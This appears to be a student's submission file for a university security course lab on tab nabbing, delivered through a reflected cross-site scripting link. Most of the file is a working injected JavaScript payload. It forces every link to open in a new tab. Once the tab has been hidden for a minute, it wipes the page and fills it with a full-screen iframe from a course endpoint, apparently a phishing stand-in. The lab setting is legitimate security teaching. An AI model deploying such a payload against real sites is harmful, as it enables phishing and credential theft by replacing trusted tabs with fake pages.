/*
    !!!!!!!! IMPORTANT !!!!!!!
    In this task, you are tasked with implementing a tab nabbing attack. 
    To receive full points, you must submit your code using this file. 
    Please follow the format outlined below.
*/

/*
    Your exploitable link should look like:
    --> https://cs6262.gtisc.gatech.edu/vulnerable/endpoint/?whaterver<script>X</script> whatever

    NOTE: You can include comments in the coding section.
    TODO: Please copy X in the coding section below.
*/

/* Coding section start */

<script>
(function() {
    document.querySelectorAll('a').forEach(function(link) {
        link.setAttribute('target', '_blank');
        link.addEventListener('click', function(event) {
            event.preventDefault();
            const url = this.href;
            let newAnchor = document.createElement('a');
            newAnchor.setAttribute('href', url);
            newAnchor.setAttribute('target', '_blank');
            newAnchor.click();
        });
    });
    var timer;
    var elapsedTime = 0;
    const checkInterval = 1000;
    document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            timer = setInterval(function() {
                elapsedTime += checkInterval;
                if (elapsedTime >= 60000) {
                    document.body.innerHTML = '';
                    var iframe = document.createElement('iframe');
                    iframe.setAttribute('src', 'https://cs6262.gtisc.gatech.edu/tabnabbing/skhadka9');
                    iframe.style.width = '100%';
                    iframe.style.height = '100%';
                    iframe.style.border = 'none';
                    document.body.appendChild(iframe);
                    clearInterval(timer);
                }
            }, checkInterval);
        } else {
            clearInterval(timer);
            elapsedTime = 0;
        }
    });
})();
</script>
/* Coding section end */